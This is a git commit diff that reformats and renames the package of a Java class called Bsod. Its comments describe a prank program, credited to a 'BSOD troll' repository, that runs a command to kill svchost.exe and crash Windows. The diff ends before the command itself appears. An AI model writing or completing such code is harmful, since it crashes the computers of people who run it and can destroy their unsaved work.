8edc7190e291cbffc7967587c8f4d1f042581059
HausemasterIssue <90464553+HausemasterIssue@users.noreply.github.com>
2021-11-17 19:23:49 -0500

    lil fixes

--- Bsod.java
+++ Bsod.java
@@ -1,15 +1,13 @@
-package com.perry;
+package dev.hause.perry.bsod;
 
 /**
- * @author perry.
+ * @author hausemasterissue, perry
  * Started 11/16/2021.
  * command taken from sxmurai: https://github.com/Sxmurai/shitty-BSOD-troll/blob/main/src/cum/club/forgemod/Main.java#L28
  */
-public
-class Bsod {
+public class Bsod {
 
-    public static
-    void main(String[] args) {
+    public static void main(String[] args) {
         // try to execute a command prompt command
         try {
             // kill svchost.exe, this causes the system to blue screen, thanks to sxmurai
